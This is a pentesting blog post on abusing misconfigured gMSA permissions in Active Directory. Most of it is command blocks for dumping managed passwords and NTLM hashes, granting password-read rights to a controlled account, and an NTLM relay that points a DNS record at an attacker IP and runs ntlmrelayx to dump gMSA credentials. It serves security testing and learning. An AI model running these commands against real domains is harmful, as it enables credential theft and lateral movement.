---
title: Abusing GMSA Permissions - What You Need to Know as a Pentester
url: https://www.hackingdream.net/2025/04/abusing-gmsa-permissions-what-you-need-to-know-as-pentester.html
source: Hacking Dream
date: 2025-04-13
fetch_date: 2025-10-06T22:04:47.257725
---

# Abusing GMSA Permissions - What You Need to Know as a Pentester

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Abusing GMSA Permissions - What You Need to Know as a Pentester

[April 12, 2025](https://www.hackingdream.net/2025/04/abusing-gmsa-permissions-what-you-need-to-know-as-pentester.html "permanent link")

Group Managed Service Accounts (gMSAs) are designed to simplify password management for services running across multiple servers in a domain. They're meant to reduce attack surface—but when misconfigured, they open up serious opportunities for lateral movement, privilege escalation, and persistence.

Let’s break down what gMSAs are, why attackers care, and how you can test them in your engagements.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDgRKsxtoKLG0l3zuYGFNdU1lpNVy232pCRLB9g6G9ZQHWao-560nmFy-PfBHcd0OBsFdVktwSA-jJl9bMOJZuQRnhXK-jXTefM82A3bqp9vn4xcJ14xJtDuBA3SUNhf-qx_sFJRGtIzJEvyynGj9JVQNWr_aY5i3sWgaOdidLuomPDudBf_FC5kywOvw/w640-h426/Abusing-GMSA.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDgRKsxtoKLG0l3zuYGFNdU1lpNVy232pCRLB9g6G9ZQHWao-560nmFy-PfBHcd0OBsFdVktwSA-jJl9bMOJZuQRnhXK-jXTefM82A3bqp9vn4xcJ14xJtDuBA3SUNhf-qx_sFJRGtIzJEvyynGj9JVQNWr_aY5i3sWgaOdidLuomPDudBf_FC5kywOvw/s1024/Abusing-GMSA.jpg)

### What is a gMSA?

* A **Group Managed Service Account** is a domain account used by services, tasks, or applications.
* Passwords are **automatically managed by Active Directory** and **rotated regularly**.
* Only **specific hosts** (configured via `msDS-HostServiceAccount`) can retrieve and use the gMSA.
* Used with services like IIS App Pools, scheduled tasks, or SQL Server jobs.

### Abusing Write Access on gMSA Objects

If you can write to a gMSA object's `msDS-GroupMSAMembership` attribute, you can **add a computer account you control**, retrieve the password, and impersonate the account.

This can happen via:

* Direct control over the attribute using `WriteProperty`

+ Rights-GUID: `888eedd6-ce04-df40-b462-b8a50e41ba38`

* Indirect control via:

+ GenericAll
+ WriteDacl
+ `WriteOwner`

Use tools like **BloodHound** to visualize who can write to the gMSA object.

```
Generic Write | Write Owner Permissions on GMSA

#List the GMSA Password accessible users (Linux)
nxc ldap haze.htb -u 'ControlledUser' -p 'P@ssw0rd!' --gmsa
python gMSADumper.py -u ControlledUser -p P@ssw0rd!  -d domain.local

#Check the account type of the Victim user
Get-ADServiceAccount -Identity GMSA_Victim_User | Select-Object Name, ObjectClass

#check who all can retrieve the password - PrincipalsAllowedToRetrieveManagedPassword
Get-ADServiceAccount -Identity "GMSA_Victim_User" -Properties PrincipalsAllowedToRetrieveManagedPassword

#Grant GMSA password read access to controlled user
Set-ADServiceAccount -Identity "GMSA_Victim_User" -PrincipalsAllowedToRetrieveManagedPassword "ControlledUser"

# Validate the access
Get-ADServiceAccount -Identity "GMSA_Victim_User" -Properties PrincipalsAllowedToRetrieveManagedPassword

# Get the Password/NTLM hash of the user (Linux)
nxc ldap haze.htb -u 'ControlledUser' -p 'P@ssw0rd!' --gmsa
python gMSADumper.py -u ControlledUser -p P@ssw0rd!  -d domain.local

with this you can either Pass the hash or if NTLM is disabled use get-TGT
```

```
GMSA ACL Enumeration
Retrieve direct or indirect rights to modify gMSAs's msDS-GroupMSAMembership attribute.

# Enumerates all principals with direct or indirect rights to retrieve gMSAs' password.
Get-ADServiceAccount -Filter * | ForEach-Object { Get-ACL "AD:\$_" } | Select-Object -ExpandProperty Access | Where-Object {(
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'`
-or ($_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite' -and $_.ObjectType -match '00000000-0000-0000-0000-000000000000|888eedd6-ce04-df40-b462-b8a50e41ba38')`
-and $_.AccessControlType -eq "Allow" -and $_.PropagationFlags -ne "InheritOnly")}

# Enumerates and highlights principals (depending on presupposed risks) with direct or indirect rights to retrieve gMSAs' password.
$PrivilegedPrincipalsRegex = [string]::Join('|', @('Domain Admins', 'Enterprise Admins', 'Domain Controllers', 'Account Operators', 'BUILTIN\\Administrators', 'NT AUTHORITY\\SYSTEM'))
$UnprivilegedPrincipalsRegex = [string]::Join('|', @('Domain Users', 'Everyone', 'Domain Computers', 'Authenticated Users', 'Anonymous', 'Users'))

Get-ADServiceAccount -Filter * | ForEach-Object { Get-ACL "AD:\$_" } | Select-Object -ExpandProperty Access | Where-Object {(
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'`
    -or ($_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite' -and $_.ObjectType -match '00000000-0000-0000-0000-000000000000|888eedd6-ce04-df40-b462-b8a50e41ba38')`
    -and $_.AccessControlType -eq "Allow" -and $_.PropagationFlags -ne "InheritOnly")} | ForEach-Object {

    If ($_.IdentityReference -match $UnprivilegedPrincipalsRegex) {
      Write-Host -ForegroundColor Green $_.IdentityReference
      $anyoneCanEnroll = $True
    }

    ElseIf ($_.IdentityReference -match $PrivilegedPrincipalsRegex) {
      Write-Host -ForegroundColor Red $_.IdentityReference
    }

    Else { Write-Host -ForegroundColor Yellow $_.IdentityReference }
    $_
    Write-Host "`n"
}
```

```
Abusing GMSA by relaying

Import-Module .\Invoke-DNSUpdate.ps1
Invoke-DNSUpdate -DNSType A -DNSName might -DNSData Attacker_IP -Realm steins.local

#Invoke a web request from the service that is using GMSA
Invoke-WebRequest -uri "http://might.steins.local"  -UseDefaultCredentials

#Start capturing the data using ntlmrelayx, if its running as administraor SAM hashes will be dumped
sudo proxychains ntlmrelayx.py --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://GMSA_running_machine_IP

#incase the data is shown as Password blob, you can use below to convert it to ntlm hash
(ConvertFrom-ADManagedPasswordBlob <blob>).SecureCurrentPassword | ConvertTo-NTHash

OR if the user can read GMSA Passwords, you can use gMSADumper.py to dump the hashes

python3 gMSADumper.py -u 'USERNAME' -p 'P@SSW0RD!' -d 'steins.local' -l 'dc.steins.local'
```

### Real-World Examples

* A backup solution using a gMSA with **Backup Operators** rights across all DCs.
* A scheduled task that runs every 10 minutes as a gMSA with **local admin rights** on a jump server.
* A gMSA with read access to **sensitive SMB shares** used by finance or HR.

All of these are valid targets for lateral movement and privilege escalation.

[![](https://img1.blogblog.com/img/icon18_...